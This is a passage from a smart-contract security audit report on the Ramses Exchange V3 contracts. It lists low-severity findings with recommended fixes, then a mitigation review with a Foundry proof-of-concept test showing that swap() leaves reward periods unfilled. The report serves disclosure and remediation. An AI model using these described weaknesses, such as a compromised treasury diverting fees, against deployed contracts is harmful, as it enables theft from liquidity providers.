        uint256 _treasuryFees
    ) external override onlyTreasury {
        require(_treasuryFees <= BASIS, FTL());
        emit TreasuryFeesChanged(treasuryFees, _treasuryFees);

        treasuryFees = _treasuryFees;
    }

```

https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/gauge/FeeCollector.sol#L56-L64

### Recommended Mitigation

Add a Minimum Fee Check.

```solidity
require(_treasuryFees > 0, "Fee cannot be zero");  // Prevent 0 fee
``` 


## [L-05] Flash loan (`flash()`) reverts when requested amount exceeds available token balances

In the flash loan function, the transaction will revert if the requested amount of token0 or token1 exceeds the available balance held by the contract. 

```solidity
FILE:2024-10-ramses-exchange/contracts/CL/core/RamsesV3Pool.sol

if (amount0 > 0) TransferHelper.safeTransfer(token0, recipient, amount0);
if (amount1 > 0) TransferHelper.safeTransfer(token1, recipient, amount1);

```

https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/core/RamsesV3Pool.sol#L695-L696

- `safeTransfer` ensures that the requested tokens are successfully transferred to the borrower.
- If the contract’s balance of `token0` or `token1` is insufficient, the transfer fails and triggers a revert.

### Recommended Mitigation

Adding Preemptive Checks can prevent reverts during the transfer by checking the contract's balance before initiating the transfer.

```solidity

if (amount0 > balance0()) revert InsufficientToken0();
if (amount1 > balance1()) revert InsufficientToken1();

```


## [L-06] Incorrect non-negative check on unsigned integer `_liquidity`

The condition if (`_liquidity <= 0`) is incorrect because `_liquidity` is `uint128` being less than 0 is impossible. The only meaningful edge case is when `_liquidity == 0`, which should be explicitly checked. The incorrect condition causes confusion. 

```solidity
FILE:2024-10-ramses-exchange/contracts/CL/core/RamsesV3Pool.sol

if (_liquidity <= 0) revert L();

```
https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/core/RamsesV3Pool.sol#L688

### Recommended Mitigation

```solidity

if (_liquidity == 0) revert L();

```


## [L-07] Compromised or malicious treasury can disable fee distribution and seize all protocol fees

### Impact

The attacker can collect all accumulated protocol fees by exploiting the `isTokenLive` flag.

The gauge-based fee distribution system becomes non-functional, affecting `users` and `LPs` who are supposed to receive a `share of the fees`.

```solidity
FILE:2024-10-ramses-exchange/contracts/CL/gauge/FeeCollector.sol

 /// @notice for tokenless deployments, disable fee distribution until ve system exists
    function setIsLive(bool status) external onlyTreasury {
        isTokenLive = status;
    }

 /// @dev if there's no gauge, there's no fee distributor, send everything to the treasury directly
        if (gauge == address(0) || !isAlive || !isTokenLive) {
            (uint128 _amount0, uint128 _amount1) = pool.collectProtocol(
                treasury,
                type(uint128).max,
                type(uint128).max
            );

```

https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/gauge/FeeCollector.sol#L89-L95

The `setIsLive` function allows the treasury to control the `isTokenLive` status, which determines whether fees are distributed via the fee distributor or sent directly to the treasury. If the treasury address is compromised or controlled by a malicious actor, they could:

- Set isTokenLive to false by calling setIsLive.

- This triggers the following logic

```solidity

if (gauge == address(0) || !isAlive || !isTokenLive) {
    pool.collectProtocol(treasury, type(uint128).max, type(uint128).max);
}

```

Instead of distributing fees properly, all protocol fees are collected directly by the compromised treasury.

### Recommended Mitigation

Introduce an Admin Role. Implement the onlyOwner modifier to control important changes.


## [L-08] Failure to block zero amount rewards in `notifyRewardAmountNextPeriod()` and `notifyRewardAmountForPeriod()` functions

Current implementation of [notifyRewardAmountNextPeriod()](https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/gauge/GaugeV3.sol#L165-L179) and [notifyRewardAmountForPeriod()](https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/gauge/GaugeV3.sol#L182-L197) functions allows the reward amount of 0.

### Recommended Mitigation

Adding a `require(amount > 0)` check ensures that the function only proceeds with valid, non-zero transfers.


## [L-09] Unsafe `unchecked` block and potential overflow risk 

The use of the `unchecked` block in the code introduces a risk of overflow if the `tokensOwed0` and `tokensOwed1` values grow too large, especially when fees accumulate over a long period without being collected by the position owner. Although `the comment suggests that the fees should be collected to avoid overflow`, there is `no enforced deadline` for the owner to collect them.

If an overflow occurs in the `tokensOwed0` or `tokensOwed1` calculations, the fees reset to 0, causing the owner to lose accumulated fees. 

Since arithmetic overflow checks are disabled inside the unchecked block, Solidity's default protections do not apply. This makes overflow possible if the position accumulates fees over an extended period without being claimed.

Without a mechanism or deadline to force fee collection, users may forget to claim fees, increasing the risk of overflow and loss of value.

```solidity
FILE: 2024-10-ramses-exchange/contracts/CL/periphery
/NonfungiblePositionManager.sol

  unchecked {
            position.tokensOwed0 += uint128(
                FullMath.mulDiv(
                    feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128,
                    position.liquidity,
                    FixedPoint128.Q128
                )
            );
            position.tokensOwed1 += uint128(
                FullMath.mulDiv(
                    feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128,
                    position.liquidity,
                    FixedPoint128.Q128
                )
            );
        }

```

https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/periphery/NonfungiblePositionManager.sol#L236C7-L251C10

### Recommended Mitigation

Consider removing `unchecked` from `position.tokensOwed0` and `position.tokensOwed1` blocks.


## [L-10] `getPeriodReward()` function allows transfers to zero address without `receiver` address validation 

The `getPeriodReward()` function does not enforce a check to ensure the receiver is not the zero address (address(0)).

The `safeTransfer` reverts if the recipient is the zero address (address(0)), which adds a layer of protection. However, it’s still good practice to explicitly check for address(0) in your function to prevent unnecessary calls and ensure clarity and consistency across your contract.

```solidity
FILE:2024-10-ramses-exchange/contracts/CL/gauge/GaugeV3.sol

 /// @inheritdoc IGaugeV3
    function getPeriodReward(
        uint256 period,
        address[] calldata tokens,
        uint256 tokenId,
        address receiver
    ) external override lock {
        INonfungiblePositionManager _nfpManager = nfpManager;
        address owner = _nfpManager.ownerOf(tokenId);
        address operator = _nfpManager.getApproved(tokenId);

        /// @dev check if owner, operator, or approved for all
        require(
            msg.sender == owner ||
                msg.sender == operator ||
                _nfpManager.isApprovedForAll(owner, msg.sender),
            "Not authorized"
        );

        (, , , int24 tickLower, int24 tickUpper, , , , , ) = _nfpManager
            .positions(tokenId);

        bytes32 _positionHash = positionHash(
            address(_nfpManager),
            tokenId,
            tickLower,
            tickUpper
        );

        for (uint256 i = 0; i < tokens.length; ++i) {
            if (period < _blockTimestamp() / WEEK) {
                lastClaimByToken[tokens[i]][_positionHash] = period;
            }

            _getReward(
                period,
                tokens[i],
                address(_nfpManager),
                tokenId,
                tickLower,
                tickUpper,
                _positionHash,
                receiver
            );
        }
    }


```
https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/gauge/GaugeV3.sol#L338-L382

### Recommended Mitigation

Updated Code with `address(0)` Check.

```solidity

require(receiver != address(0), "Invalid receiver address");

```


## [L-11] `getPeriodReward()` always reverts when receiver is `address(0)`

Instead of reverting when the receiver address is address(0), the function can be modified to automatically redirect the rewards to the owner of the position. This ensures that rewards are not lost and avoids unnecessary reverts while maintaining flexibility. 

[getPeriodReward()](https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/gauge/GaugeV3.sol#L338-L382)

### Recommended Mitigation

Add this line to `getPeriodReward()` function like [collect()](https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/periphery/NonfungiblePositionManager.sol#L332) function did.

```solidity

// If receiver is address(0), default to the owner of the token
receiver = receiver == address(0) ? owner : receiver;

```


## [L-12] Setters lack equality and zero address checks, allowing redundant updates and risk of invalid address assignment

Setting the same address as the existing `feeCollector` results in unnecessary events being emitted and wasted gas costs.

If the fee collector is mistakenly set to `address(0)`, any collected fees would be burned and unrecoverable, disrupting the protocol's financial operations.

```solidity
FILE:2024-10-ramses-exchange/contracts/CL/core
/RamsesV3Factory.sol

 /// @inheritdoc IRamsesV3Factory
    function setFeeCollector(address _feeCollector) external override restricted {
        emit FeeCollectorChanged(feeCollector, _feeCollector);
        feeCollector = _feeCollector;
    }

```

https://github.com/code-423n4/2024-10-ramses-exchange/blob/4a40eba36bc47eba8179d4f6203a4b84561a4415/contracts/CL/core/RamsesV3Factory.sol#L168-L172

### Recommended Mitigation

Add these checks: 

```solidity
require(_feeCollector != address(0), "Invalid address: zero address");
require(_feeCollector != feeCollector, "Address already set as fee collector");

```


***

# [Mitigation Review](#mitigation-review)

## Summary

Following the audit, three of C4's [Zenith Researchers](https://code4rena.com/zenith) ([peakbolt](https://code4rena.com/@peakbolt), [SpicyMeatball](https://code4rena.com/@spicymeatball), and [victormagnum_](https://code4rena.com/@victormagnum_)) reviewed the mitigations implemented by the Ramses' team.

The mitigation review concluded with one Medium severity issue the Zenith Researchers uncovered, which has since been resolved. The summary of this finding is provided below.

***

## `swap()` fails to fill skipped periods causing incorrect gauge rewards

### Severity

Medium

### Context

- `RamsesV3Pool.sol#L424-L465`

### Description

`_advancePeriod()` has been updated with a loop to fill the `PeriodInfo` from the last unfilled period up to current period. This resolved the issue in https://github.com/code-423n4/2024-10-ramses-exchange-findings/issues/39 that cause gauge rewards to be incorrect when the periods are skipped due to inactivity.

However, the fix is only applied for `mint()` and `burn()` using `advancePeriod` modifier while the `swap()` still retain the old code that do not fill the skipped periods. 

Furthermore, `swap()` will set `$.lastPeriod` to the latest period, which means subsequent calls to `_advancePeriod()` will not fill the skipped periods too as it starts filling from `$.lastPeriod`.

Add and run the following test case in `test/TestHistoricalDataIssue.sol`.

```Solidity
    function testSwapAdvancePeriodIssue() public {
        // Adjust time to enter first period. We start from period = 1 and not period = 0 since periodsInsideX96 is returned as 0 when checkpoint period is 0. 
        
        vm.warp(0); // Set block.timestamp to 0 directly (foundry starts with 1)
        skip(1 weeks); // Fast forward 1 week (i.e. 1 period) 
        assertEq(block.timestamp, 1 weeks);
        console.log("Entered period 1");
        
        // Mint position in first period
        uint256 index = 0;
        int24 tickLower = TickMath.MIN_TICK;
        int24 tickUpper = TickMath.MAX_TICK;
        console.log("Minted a position in period 1");
        pool.mint(address(this), index, tickLower, tickUpper, 10e18, "");

        console.log("Entered period 2");
        console.log("No interactions during period 2");
        
        // Skip 2 weeks to enter period 3 
        skip(2 weeks);
        assertEq(block.timestamp, 3 weeks);
        console.log("Entered period 3");


        // swap() will fail to fill skipped period and set lastPeriod = 3
        console.log("swap() performed in period 3 ");
        pool.swap(address(this), false, 1e3, 10000e18, abi.encode(false));

        // _advancePeriod() after swap() will not fill skipped period as lastPeriod has been set in previous swap()
        console.log("_advancePeriod() called in period 3 through other interactions");
        pool._advancePeriod();

        uint256 periodSecondsInsideX96 = pool.positionPeriodSecondsInRange(1, address(this), index, tickLower, tickUpper);
        console.log("Expected Seconds Inside Period 1:", 1 weeks * 2**96);
        console.log("Actual Seconds Inside Period 1:", periodSecondsInsideX96);

        periodSecondsInsideX96 = pool.positionPeriodSecondsInRange(2, address(this), index, tickLower, tickUpper);
        console.log("Expected Seconds Inside Period 2:", 1 weeks * 2**96);
        console.log("Actual Seconds Inside Period 2:", periodSecondsInsideX96);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        bool zeroForOne = abi.decode(data, (bool));
        if (zeroForOne) {
            address token0 = pool.token0();
            TestERC20(token0).mint(address(this), uint256(amount0Delta));
            TestERC20(token0).transfer(address(pool), uint256(amount0Delta));
        } 
        else {
            address token1 = pool.token1();
            TestERC20(token1).mint(address(this), uint256(amount1Delta));
            TestERC20(token1).transfer(address(pool), uint256(amount1Delta));
        }
    }
```

### Recommendation

Update `swap()` to use `advancePeriod` modifier that loops through all the unfilled period and remove the existing code for filling period.

```diff
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
-    ) external override returns (int256 amount0, int256 amount1) {
+    ) external advancePeriod override returns (int256 amount0, int256 amount1) {
        /// @dev fetch storage $
        PoolStorage.PoolState storage $ = PoolStorage.getStorage();
        /// @dev fetch the current period
        uint256 period = _blockTimestamp() / 1 weeks;
        /// @dev fetch slot0 from storage
        Slot0 memory slot0Start = $.slot0;

-        /// @dev if in a new week, record lastTick for the previous period
-        /// @dev also record secondsPerLiquidityCumulativeX128 for the start of the new period
-        uint256 _lastPeriod = $.lastPeriod;
-        /// @dev if the last period is not equal to the current period
-        if (period != _lastPeriod) {
-            /// @dev set storage lastPeriod to current period
-            $.lastPeriod = period;

-            /// @dev start a new period in observations
-            uint160 secondsPerLiquidityCumulativeX128 = Oracle.newPeriod(
-                $.observations,
-                slot0Start.observationIndex,
-                period
-            );

-            /// @dev record last tick and secondsPerLiquidityCumulativeX128 for old period
-            $.periods[_lastPeriod].lastTick = slot0Start.tick;
-            $.periods[_lastPeriod].endSecondsPerLiquidityPeriodX128 = secondsPerLiquidityCumulativeX128;

-            /// @dev record start tick and secondsPerLiquidityCumulativeX128 for new period
-            PeriodInfo memory _newPeriod;
-            /// @dev set _lastPeriod (casted to uint32) as the previous period
-            _newPeriod.previousPeriod = uint32(_lastPeriod);
-            /// @dev set the startTick for the period as slot0's tick value
-            _newPeriod.startTick = slot0Start.tick;
-            /// @dev update the PeriodInfo for the period
-            $.periods[period] = _newPeriod;
-        }
        /// @dev if amountSpecified is 0, revert
        if (amountSpecified == 0) revert AS();
        /// @dev reentrancy/lock check, ensure it is unlocked
        if (!slot0Start.unlocked) revert LOK();
        require(
            zeroForOne
                ? sqrtPriceLimitX96 < slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 > TickMath.MIN_SQRT_RATIO
                : sqrtPriceLimitX96 > slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 < TickMath.MAX_SQRT_RATIO,
            SPL()
        );
        /// @dev set the lock to false in storage
        $.slot0.unlocked = false;


```

### Client:

Fixed in `https://github.com/RamsesExchange/Ramses-V3/commit/bdd0168d65b9302774e1ca2dad049cb2150216d2`.

### Zenith:

Verified.


***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
